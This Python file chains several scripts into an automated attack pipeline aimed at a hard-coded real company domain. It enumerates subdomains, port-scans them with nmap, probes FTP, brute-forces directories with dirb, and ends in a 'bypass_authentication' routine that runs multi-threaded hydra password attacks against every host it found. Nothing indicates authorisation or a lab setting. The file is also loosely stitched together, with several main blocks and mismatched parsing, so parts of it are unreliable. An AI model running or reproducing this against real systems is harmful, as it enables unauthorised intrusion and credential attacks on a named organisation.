import subprocess
import time
import re
import nmap

scanned_subdomains = set()

def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = process.communicate()
    return output.decode()

def scan_command_with_delay(command):
    run_command(f'gnome-terminal -- bash -c "{command}; echo scan completed; sleep 5"')

def is_domain_or_ip(subdomain):
    if subdomain.endswith('.com') or re.match(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', subdomain):
        return True
    return False

def scan_subdomains(subdomains):
    for subdomain in subdomains:
        if subdomain not in scanned_subdomains and is_domain_or_ip(subdomain):
            print(f"Scanning subdomain: {subdomain}")
            commands = [
                f"amass enum -d {subdomain} | tee -a scan_results2.txt",
                f"subfinder -d {subdomain} | tee -a scan_results2.txt",
                f"assetfinder --subs-only {subdomain} | tee -a scan_results2.txt"
            ]
            for command in commands:
                scan_command_with_delay(command)
                time.sleep(20)
            scanned_subdomains.add(subdomain)

def branch1(target):
    commands = [
        f"amass enum -d {target} | tee -a scan_results.txt",
        f"subfinder -d {target} | tee -a scan_results.txt",
        f"assetfinder --subs-only {target} | tee -a scan_results.txt"
    ]
    for command in commands:
        scan_command_with_delay(command)
        time.sleep(30)

def scan_com_domains(com_domains, filename="scan_results.txt"):
    for domain in com_domains:
        print(f"Scanning domain: {domain}")
        commands = [
            f"amass enum -d {domain} -o | tee -a scan_results2.txt",
            f"subfinder -d {domain} | tee -a scan_results2.txt",
            f"assetfinder --subs-only {domain} | tee -a scan_results2.txt"
        ]
        for command in commands:
            scan_command_with_delay(command)
            time.sleep(30)

def nmap_scan(domain):
    try:
        nm = nmap.PortScanner()
        nm.scan(domain, arguments='-p 1-1000')
        with open('ports.txt', 'a') as file:
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    lport = nm[host][proto].keys()
                    for port in lport:
                        file.write(f"{host};{domain};{proto};{port};{nm[host][proto][port]['name']};{nm[host][proto][port]['state']}\n")
    except Exception as e:
        print(f"An error occurred while scanning domain {domain}: {e}")

def mainloopportrecon(filename, filename2):
    try:
        with open(filename, 'r') as file:
            domains = file.readlines()
            for domain in domains:
                domain = domain.strip()
                print(f"Scanning domain: {domain}")
                nmap_scan(domain)
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")



if __name__ == "__main__":
    target_host = "Zillow.com" #<---------------------------------
    branch1(target_host)
    time.sleep(30)
    com_domains = []
    with open("scan_results.txt", "r") as file:
        for line in file:
            if line.strip().endswith(".com"):
                com_domains.append(line.strip())
    scan_com_domains(com_domains)
    time.sleep(20 * len(com_domains))
    mainloopportrecon('scan_results.txt', 'scan_results2.txt')


















def remove_non_numeric_chars(filename):
    cleaned_data = []
    with open(filename, 'r') as file:
        for line in file:
            cleaned_line = ''.join(char for char in line if char.isdigit() or char == '.')
            # replace consecutive dots with a single semicolon
            cleaned_line = cleaned_line.replace('..', ';')
            # remove consecutive semicolons
            cleaned_line = remove_consecutive_semicolons(cleaned_line)
            cleaned_data.append(cleaned_line)
    return cleaned_data

def remove_consecutive_semicolons(line):
    # replace consecutive semicolons with a single semicolon
    return ';'.join(filter(None, line.split(';')))

def save_cleaned_data(data, output_filename):
    with open(output_filename, 'w') as output_file:
        for line in data:
            output_file.write(line + '\n')

if __name__ == "__main__":
    input_filename = 'ports.txt'
    output_filename = 'cleaned_ports.txt'
    cleaned_data = remove_non_numeric_chars(input_filename)
    save_cleaned_data(cleaned_data, output_filename)
    print("Data cleaned and saved to 'cleaned_ports.txt'.")















import socket

def check_ftp(ip_address, port, output_file):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)  # set a timeout for the connection attempt
            s.connect((ip_address, port))
            output_file.write(f"FTP access available on {ip_address}:{port}\n")
    except Exception as e:
        output_file.write(f"FTP access not available on {ip_address}:{port}. Error: {e}\n")

if __name__ == "__main__":
    with open('cleaned_ports.txt', 'r') as file:
        with open('ftp_results.txt', 'w') as output_file:
            for line in file:
                parts = line.strip().split(';')
                if len(parts) >= 2:
                    ip_address = parts[0]
                    port_str = parts[1]
                    if port_str.isdigit():  # check if port string contains only digits
                        port = int(port_str)
                        output_file.write(f"Checking FTP access on {ip_address}:{port}\n")
                        check_ftp(ip_address, port, output_file)
                    else:
                        output_file.write(f"Skipping line: Invalid port number - {port_str}\n")
                else:
                    output_file.write("Skipping line: Insufficient data\n")
                    
                    
                    
                  














def perform_dirb_scan(filename):
    try:
        with open(filename, 'r') as file:
            lines = file.readlines()
            for line in lines:
                try:
                    ip, port = line.strip().split(';')
                except ValueError:
                    print(f"Issue with formatting in line: {line.strip()}. Skipping...")
                    continue

                command = f'dirb http://{ip}:{port} -o temp_dirb_output.txt'
                try:
                    subprocess.run(command, shell=True, check=True, text=True)
                    
                    with open('temp_dirb_output.txt', 'r') as output_file:
                        output = output_file.read()
                    
                    print(f"Results for IP: {ip}, Port: {port}")
                    found_urls = re.findall(r'==> DIRECTORY: ([^\s]+)', output)
                    
                    if found_urls:
                        print("Found URLs:")
                        for url in found_urls:
                            print(url)
                            with open('dirb_results.txt', 'a') as result_file:
                                result_file.write(f"Found URL: {url}\n")
                    else:
                        print("No URLs found.")
                except subprocess.CalledProcessError as e:
                    print(f"Error occurred while scanning {ip} on port {port}: {e}")
                    with open('dirb_results.txt', 'a') as result_file:
                        result_file.write(f"Error occurred while scanning {ip} on port {port}: {e}\n")
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")

# Example usage:
perform_dirb_scan('cleaned_ports.txt')





















                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
import threading

def bypass_authentication(ip_address, username_list, password_list, protected_resource):
    command = f"hydra -L {username_list} -P {password_list} -t 16 -T 16 -f {ip_address} http-get /{protected_resource}"
    try:
        with open('hydra_results.txt', 'a') as output_file:
            result = subprocess.run(command, shell=True, stdout=output_file, stderr=subprocess.PIPE, text=True)
            if result.stderr:
                print(result.stderr)
    except Exception as e:
        print(f"An error occurred while bypassing authentication on {ip_address}: {e}")

def main():
    threads = []
    with open('ports.txt', 'r') as file:
        for line in file:
            ip_address, *_ = line.strip().split(';')
            t = threading.Thread(target=bypass_authentication, args=(ip_address, 'usernames.txt', 'passwords.txt', 'protected_resource.txt'))
            threads.append(t)
            t.start()

            # limit the number of concurrent threads to avoid overwhelming the system
            if len(threads) >= 10:
                for t in threads:
                    t.join()
                threads = []

    # join any remaining threads
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
           
                    

                    
                    
                    
                    
                    
